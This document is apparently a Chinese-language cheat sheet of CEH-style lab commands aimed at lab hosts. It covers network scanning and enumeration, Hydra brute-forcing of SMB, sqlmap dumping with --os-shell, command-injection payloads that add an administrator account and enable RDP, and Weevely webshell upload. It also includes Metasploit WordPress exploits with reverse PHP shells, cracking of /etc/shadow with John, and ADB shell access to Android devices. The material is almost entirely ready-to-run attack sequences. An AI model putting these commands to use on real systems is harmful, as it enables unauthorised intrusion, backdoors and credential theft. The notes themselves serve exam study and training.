### 掃描與列舉

<details>
  <summary>使用NMAP掃描網路</summary>
  
  ``` console
  nmap -sn 10.10.10.*
  nmap -sn 10.10.10.* --packet-trace
  nmap -sn scanme.nmap.org --packet-trace
  ```
</details>

<details>
  <summary>使用NMAP掃描主機</summary>

  ```console
  nmap 10.10.10.9
  nmap 10.10.10.9 --reason
    最常用的1000個端口/usr/share/nmap/nmap-services
  nmap 10.10.10.9 -p-
  nmap 10.10.10.16 -sU -p53,137-139,161,1900,5353
  nmap -p80 10.10.10.*
  nmap -p80 10.10.10.2,10,13 --reason
  nmap -p80 10.10.10.* --open
  ```
</details>

<details>
  <summary>使用NMAP識別作業系統與服務</summary>

  ```console
  nmap 10.10.10.16 -O
  nmap 10.10.10.16 -sV
  nmap 10.10.10.16 -sVC -p445,3389
  nmap 10.10.10.16 -sV -O -sC -Pn -p445,3389,389,3268
    for windows
  ```
</details>

<details>
  <summary>列舉常見網路服務</summary>

  ```console
  nmap -sU -p161 --open 10.10.10.*
  nmap -sU -p161 -sC 10.10.10.*
  snmp-check 10.10.10.16
  nmap -sU -p161 --script snmp-win32-users 10.10.10.16
  nbtscan 10.10.10.1-254
  enum4linux 10.10.10.16
  hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst smb://10.10.10.16
  hydra -l jason -P /usr/share/wordlists/nmap.lst smb://10.10.10.16
    smb可換rdp
  enum4linux -u martin -p apple -a 10.10.10.16
    -a可替換-S -U -P
  python3 -m pip install --upgrade impacket
  crackmapexec smb 10.10.10.16 -u martin -p apple --shares
  ```
</details>

### 掃描與攻擊網頁程式

- 參數串改攻擊
<details>
  <summary>MSSQL隱碼攻擊</summary>

  ```console
  sqlmap -u "url" --cookie="<cookie>" 
  sqlmap -u "url" --cookie="<cookie>" --dbs 
  sqlmap -u "url" --cookie="<cookie>" -D dbname --tables 
  sqlmap -u "url" --cookie="<cookie>" -D dbname -T users -dump
  sqlmap -u "url" --cookie="<cookie>" -D dbname -T users --columns --technique=B 
  sqlmap -u "url" --cookie="<cookie>" -D dbname -T users -dump --technique=B 
  sqlmap -u "url" --cookie="<cookie>" --os-shell
  ```
</details>

- MySQL盲隱碼攻擊

<details>
  <summary>命令注入攻擊</summary>

  ```console
  | whoami
  | net user cehp /add
  | net users
  | net localgroup Administrators cehp /add
  | net localgroup Administrators
  | reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  | netstat -an | findstr :3389
  ```
</details>

<details>
  <summary>Webshell上傳攻擊</summary>

  ```console
  weevely generate cehp backdoor.php
  weevely http://10.10.10.16:8080/dvwa/hackable/uploads/backdoor.php cehp
  whoami
  ```
</details>

<details>
  <summary>利用WPScan破解WordPress使用者密碼</summary>

  ```console
  whatweb http://10.10.10.16:8080/ceh
  wpscan --url http://10.10.10.16:8080/ceh -e u
  wpscan --url http://10.10.10.16:8080/ceh -P /usr/share/wordlists/nmap.lst
  ```
</details>

<details>
  <summary>利用Metasploit攻擊WordPress網站</summary>

  ```console
  sudo service postgresql start
  msfconsole
  use exploit/unix/webapp/wp_admin_shell_upload
  show info
  set rhosts 10.10.10.16
  set rport 8080
  set targeturi /ceh
  set username admin
  set password qwerty@123
  set payload php/reverse_php
  exploit
  whoami
  ```
</details>

- 安裝WordPress

<details>
  <summary>利用外掛漏洞攻擊WordPress網站</summary>

  ```console
  wpscan --url http://10.10.10.16:8080/ceh
  sudo service postgresql start
  msfconsole
  use exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload
  show info
  set rhosts 10.10.10.16
  set rport 8080
  set targeturi /ceh
  set username cehuser1
  set password green
  set payload php/reverse_php
  exploit
  whoami
  ```
</details>

```console
ls /etc/passwd /etc/shadow
mkdir unix
cp /etc/passwd unix/passwd
cp /etc/shadow unix/shadow
ls unix/

unshadow unix/passwd unix/shadow > unix/pwdump.txt
john unix/pwdump.txt
john unix/pwdump.txt --show

網站
crackstation.net
gchq.github.io/CyberChef/
md5cal.com
github.com/orsicq/DIE-engine

ftp 10.10.10.10
jason
qwerty
get Flag.txt
```
```console
android

nmap -p5555 10.10.1.3-254 --open
adb connect 10.10.1.14:5555
adb devices
adb shell

su
find / -name images.jpeg 2> /dev/null

sha384sum /data/media/0/Download/images.jpeg

mkdir /sdcard/data
cp /data/media/0/Download/images.jpeg /sdcard/data
ls /sdcard/data
exit
exit

adb pull /sdcard/data/images.jpeg
ls images.jpeg
```
